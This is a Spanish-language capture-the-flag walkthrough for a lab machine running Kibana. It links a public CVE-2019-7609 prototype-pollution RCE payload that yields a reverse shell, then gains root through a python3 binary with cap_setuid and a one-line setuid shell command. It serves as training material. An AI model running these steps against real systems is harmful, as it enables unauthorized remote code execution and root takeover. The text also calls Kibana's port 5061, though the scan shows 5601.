

# SCAN
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
5044/tcp open  lxi-evntsvc
5601/tcp open  esmagent
```

# PORT 5061 (KIBANA)

Kibana es un plugin que permite monitorizar del forma grafica los logs y tiene una vulnerabilidad CVE-2019-7609 que consiste en la
posibilidad de ejecutar codigo remoto (RCE) basado en una vulnerabilidad llamada **Prototype Pollution** que consiste basicamente en
modificar el objeto en aquellos lenguajes de programacion (como javascript) basados en prototipos.
Existe un payload para explotar esta vulnerabilidad en: 
> https://github.com/LandGrey/CVE-2019-7609.git

Con este payload obtenemos un reverse shell que nos permite obtener de forma inmediata el user.txt

# PRIVILEGE ESCALATION
La pagina del servidor http nos da una idea del vector que tenemos que utilizar para la escalada de privilegios:

<html>
<head></head>
<body>
	<pre>
		     ,+++77777++=:,                    +=                      ,,++=7++=,,
		    7~?7   +7I77 :,I777  I          77 7+77 7:        ,?777777??~,=+=~I7?,=77 I
		=7I7I~7  ,77: ++:~+777777 7     +77=7 =7I7     ,I777= 77,:~7 +?7, ~7   ~ 777?
		77+7I 777~,,=7~  ,::7=7: 7 77   77: 7 7 +77,7 I777~+777I=   =:,77,77  77 7,777,
		  = 7  ?7 , 7~,~  + 77 ?: :?777 +~77 77? I7777I7I7 777+77   =:, ?7   +7 777?
		      77 ~I == ~77=77777~: I,+77?  7  7:?7? ?7 7 7 77 ~I   7I,,?7 I77~
		       I 7=77~+77+?=:I+~77?     , I 7? 77 7   777~ +7 I+?7  +7~?777,77I
		         =77 77= +7 7777         ,7 7?7:,??7     +7    7   77??+ 7777,
		             =I, I 7+:77?         +7I7?7777 :             :7 7
		                7I7I?77 ~         +7:77,     ~         +7,::7   7
		               ,7~77?7? ?:         7+:77           77 :7777=
		                ?77 +I7+,7         7~  7,+7  ,?       ?7?~?777:
		                   I777=7777 ~     77 :  77 =7+,    I77  777
		                     +      ~?     , + 7    ,, ~I,  = ? ,
		                                    77:I+
		                                    ,7
		                                     :777
		                                        :
				Welcome, "linux capabilities" is very interesting.
	</pre>
</body>
<html>

Para ver las capabilitis de cada fichero al que tenemos permiso de acceso hacemos:
> $ getcap -r / 2>/dev/null
Hay una capability que nos permite ejecutar python3 con suid de root en /home/kiba/.hackmeplease/python3
```
/home/kiba/.hackmeplease/python3 = cap_setuid+ep
```
explotando esta capability obtenemos un root shell

> kiba@ubuntu:/home/kiba/.hackmeplease$ ./python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'      
 
y de forma inmediata la root.txt



